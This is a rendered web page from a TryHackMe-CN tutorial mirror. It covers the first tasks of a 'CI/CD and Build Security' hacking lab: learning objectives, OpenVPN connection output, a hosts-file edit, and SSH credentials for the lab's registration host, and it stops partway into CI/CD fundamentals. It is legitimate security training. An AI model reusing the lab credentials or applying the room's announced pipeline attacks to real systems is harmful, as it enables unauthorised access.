<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Networks/cicdandbuildsecurity/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">CI/CD and Build Security | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" property="og:locale:alternate" content="zh"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="CI/CD and Build Security | TryHackMe-CN"><meta data-rh="true" name="description" content="Task 1 Introduction"><meta data-rh="true" property="og:description" content="Task 1 Introduction"><link data-rh="true" rel="icon" href="/TryHackMe-CN/en/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Networks/cicdandbuildsecurity/" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Networks/cicdandbuildsecurity/" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Networks","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Networks/"},{"@type":"ListItem","position":2,"name":"CI/CD and Build Security","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/en/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/en/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/en/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/en/assets/js/runtime~main.9ad29c9e.js" defer="defer"></script>
<script src="/TryHackMe-CN/en/assets/js/main.700abd2e.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/en/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/en/"><div class="navbar__logo"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/en/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">TryHackMe-CN</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/en/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/en/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Networks/cicdandbuildsecurity/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/en/docs/Modules/"><span title="Modules" class="categoryLinkLabel_W154">Modules</span></a><button aria-label="Expand sidebar category &#x27;Modules&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/en/docs/Networks/"><span title="Networks" class="categoryLinkLabel_W154">Networks</span></a><button aria-label="Collapse sidebar category &#x27;Networks&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/en/docs/Networks/cicdandbuildsecurity/"><span title="CI/CD and Build Security" class="linkLabel_WmDU">CI/CD and Build Security</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/en/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/TryHackMe-CN/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/en/docs/Networks/"><span>Networks</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">CI/CD and Build Security</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>CI/CD and Build Security</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-1-introduction">Task 1 Introduction<a href="#task-1-introduction" class="hash-link" aria-label="Direct link to Task 1 Introduction" title="Direct link to Task 1 Introduction" translate="no">​</a></h2>
<p>Welcome to the CI/CD and Build Security network! In this room, we will explore what it takes to secure a DevOps pipeline and the builds it produces. Understanding the potential risks and consequences of insecure build processes is essential for recognising the urgency of implementing robust security measures. In this network, we will explore common insecurities and how threat actors can exploit these to compromise not only the process, but also production systems!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="pre-requisites">Pre-Requisites<a href="#pre-requisites" class="hash-link" aria-label="Direct link to Pre-Requisites" title="Direct link to Pre-Requisites" translate="no">​</a></h3>
<ul>
<li class="">SDLC</li>
<li class="">SSDLC</li>
<li class="">Intro to Pipeline Automation</li>
<li class="">Dependency Management</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-objectives">Learning Objectives<a href="#learning-objectives" class="hash-link" aria-label="Direct link to Learning Objectives" title="Direct link to Learning Objectives" translate="no">​</a></h3>
<ul>
<li class="">Understand the significance of CI/CD and build system security within the DevSecOps pipeline.</li>
<li class="">Explore the potential risks and consequences associated with insecure CI/CD pipelines and build processes.</li>
<li class="">Gain awareness of the importance of integrating robust security measures into the build processes to ensure integrity with the deployment of applications.</li>
<li class="">Learn about the practical attacks that can happen against misconfigured CI/CD pipelines and build processes.</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I&#x27;m ready to learn about CI/CD and Build Security! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-2-setting-up">Task 2 Setting up<a href="#task-2-setting-up" class="hash-link" aria-label="Direct link to Task 2 Setting up" title="Direct link to Task 2 Setting up" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="patching-in">Patching In<a href="#patching-in" class="hash-link" aria-label="Direct link to Patching In" title="Direct link to Patching In" translate="no">​</a></h3>
<p>Let&#x27;s get you connected to the Nostromo and the greater extra-terrestrial network!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="attackbox">AttackBox<a href="#attackbox" class="hash-link" aria-label="Direct link to AttackBox" title="Direct link to AttackBox" translate="no">​</a></h3>
<p>If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room&#x27;s page. You can verify this by running the ping command against the IP of the Gitlab host. You should also take the time to make note of your VPN IP. Using <code>ifconfig</code> or <code>ip a</code>, make a note of the IP of the cicd network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="other-hosts">Other Hosts<a href="#other-hosts" class="hash-link" aria-label="Direct link to Other Hosts" title="Direct link to Other Hosts" translate="no">​</a></h3>
<p>If you are going to use your own attack machine, an OpenVPN configuration file will have been generated for you once you join the room. Go to your access page. Select &#x27;Cicdandbuildsecurity&#x27; from the VPN servers (under the network tab) and download your configuration file.</p>
<p><img decoding="async" loading="lazy" alt="VPN server" src="/TryHackMe-CN/en/assets/images/image_20251139-233923-1a6754ecc7c17a6025d1e3c2763fa91d.png" width="610" height="229" class="img_ev3q"></p>
<p>Use an OpenVPN client to connect. This example is shown on the Linux machine; use this guide to connect using <a href="https://tryhackme.com/access#pills-windows" target="_blank" rel="noopener noreferrer" class="">Windows</a> or <a href="https://tryhackme.com/access#pills-macos" target="_blank" rel="noopener noreferrer" class="">macOS</a>.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Terminal</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">thm@thm</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">$ </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> openvpn cicdandbuildsecurity.ovpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:20 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> OpenVPN </span><span class="token number" style="color:#36acaa">2.4</span><span class="token plain">.9 x86_64-redhat-linux-gnu </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">SSL </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">OpenSSL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LZO</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LZ4</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">EPOLL</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">PKCS11</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">MH/PKTINFO</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">AEAD</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> built on Apr </span><span class="token number" style="color:#36acaa">19</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:20 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> library versions: OpenSSL </span><span class="token number" style="color:#36acaa">1.1</span><span class="token plain">.1g FIPS  </span><span class="token number" style="color:#36acaa">21</span><span class="token plain"> Apr </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">, LZO </span><span class="token number" style="color:#36acaa">2.08</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:22 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> /sbin/ip </span><span class="token function" style="color:#d73a49">link</span><span class="token plain"> </span><span class="token builtin class-name">set</span><span class="token plain"> dev tun0 up mtu </span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:22 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> /sbin/ip addr </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev tun0 </span><span class="token number" style="color:#36acaa">10.50</span><span class="token plain">.2.3/24 broadcast </span><span class="token number" style="color:#36acaa">10.50</span><span class="token plain">.2.255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:22 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> /sbin/ip route </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.200</span><span class="token plain">.4.0/24 metric </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain"> via </span><span class="token number" style="color:#36acaa">10.50</span><span class="token plain">.2.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:22 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> WARNING: this configuration may cache passwords </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> memory -- use the auth-nocache option to prevent this</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fri Mar </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:06:22 </span><span class="token number" style="color:#36acaa">2022</span><span class="token plain"> Initialization Sequence Completed</span><br></span></code></pre></div></div>
<p>The &quot;Initialization Sequence Completed&quot; message tells you you are now connected to the network. Return to your access page. You can verify you are connected by looking on your access page. Refresh the page and see a green tick next to Connected. It will also show you your internal IP address.</p>
<p><img decoding="async" loading="lazy" alt="access page" src="/TryHackMe-CN/en/assets/images/image_20251155-095530-fce7de95ab253aae4767efed440804d7.png" width="599" height="295" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="configuring-dns">Configuring DNS<a href="#configuring-dns" class="hash-link" aria-label="Direct link to Configuring DNS" title="Direct link to Configuring DNS" translate="no">​</a></h3>
<p>There is only two DNS entries for this network that are important. Thus, the simplest is to embed these DNS entry directly into your hosts file regardless of whether you are using the AttackBox or your own machine. To do this, review the network diagram above and make note of the IP of the Gitlab and Jenkins host. Then, perform the following command from a terminal:</p>
<p><code>sudo echo &lt;Gitlab IP&gt; gitlab.tryhackme.loc &gt;&gt; /etc/hosts &amp;&amp; sudo echo &lt;Jenkins IP&gt; jenkins.tryhackme.loc &gt;&gt; /etc/hosts</code></p>
<p>However, if you have already started the network and need to re-add this entry or update it, use your favourite text editor program to directly modify the entry in your <code>/etc/hosts</code> file. Once configured, you can navigate to <a href="http://gitlab.tryhackme.loc/" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc</a> to verify that your access is working. You should be met with the following page:</p>
<p><img decoding="async" loading="lazy" alt="login page" src="/TryHackMe-CN/en/assets/images/image_20251159-095907-e4e95887f43dc7615cc704335cbe4acf.png" width="504" height="467" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="contacting-mu-th-ur-6000">Contacting MU-TH-UR 6000<a href="#contacting-mu-th-ur-6000" class="hash-link" aria-label="Direct link to Contacting MU-TH-UR 6000" title="Direct link to Contacting MU-TH-UR 6000" translate="no">​</a></h3>
<p>As you progress through this network, you must report your work to the MU-TH-UR 6000 mainframe, better known as Mother. You will have to register with Mother before you begin this perilous journey. SSH is being used for communication as detailed below:</p>
<table><thead><tr><th style="text-align:center">Key</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">SSH Username</td><td style="text-align:center">mother</td></tr><tr><td style="text-align:center">SSH Password</td><td style="text-align:center">motherknowsbest</td></tr><tr><td style="text-align:center">SSH IP</td><td style="text-align:center">X.X.X.250</td></tr></tbody></table>
<p>Use your network diagram to replace the X values in your SSH IP. Once you authenticate, you will be able to communicate with Mother. Follow the prompts to register for the challenge, and save the information you get for future reference. Once registered, follow the instructions to verify that you can access all the relevant systems.</p>
<p>The VPN server and the Mother mainframe are not in scope for this network, and any security testing of these systems may lead to a ban from the network.</p>
<p>As you make your way through the network, you will need to prove your compromises. To do that, you will be requested to perform specific steps on the host that you have compromised. Please note the hostnames in the network diagram above, as you will need this information. Flags can only be accessed from matching hosts.</p>
<p><strong>Note: If the network has been reset or you have joined a new subnet after your time in the network expired, your Mother account will remain active.</strong></p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I am ready to start my CI/CD and Build security learning journey. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I am connected to the network using my preferred method of choice and can confirm that I can access the Gitlab server. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> I have registered an account with Mother. </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-3-what-is-cicd-and-build-security">Task 3 What is CI/CD and Build Security?<a href="#task-3-what-is-cicd-and-build-security" class="hash-link" aria-label="Direct link to Task 3 What is CI/CD and Build Security?" title="Direct link to Task 3 What is CI/CD and Build Security?" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="introduction">Introduction<a href="#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction" translate="no">​</a></h3>
<p>Establishing a secure build environment is crucial to safeguarding your software development process against potential threats and vulnerabilities. In light of recent events such as the SolarWinds supply chain attack, it has become increasingly evident that building a robust security foundation is imperative. This task will explore key strategies to create a secure build environment, considering the lessons learned from the SolarWinds use case.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="fundamentals-of-cicd">Fundamentals of CI/CD<a href="#fundamentals-of-cicd" class="hash-link" aria-label="Direct link to Fundamentals of CI/CD" title="Direct link to Fundamentals of CI/CD" translate="no">​</a></h3>
<p>According to <a href="https://about.gitlab.com/topics/ci-cd/" target="_blank" rel="noopener noreferrer" class="">Gitlab</a>, there are eight fundamentals for CI/CD:</p>
<ul>
<li class=""><strong>A single source repository</strong> - Source code management should be used to store all the necessary files and scripts required to build the application.</li>
<li class=""><strong>Frequent check-ins to the main branch</strong> - Code updates should be kept smaller and performed more frequently to ensure integrations occur as efficiently as possible.</li>
<li class=""><strong>Automated builds</strong> - Build should be automated and executed as updates are being pushed to the branches of the source code storage solution.</li>
<li class=""><strong>Self-testing builds</strong> - As builds are automated, there should be steps introduced where the outcome of the build is automatically tested for integrity, quality, and security compliance.</li>
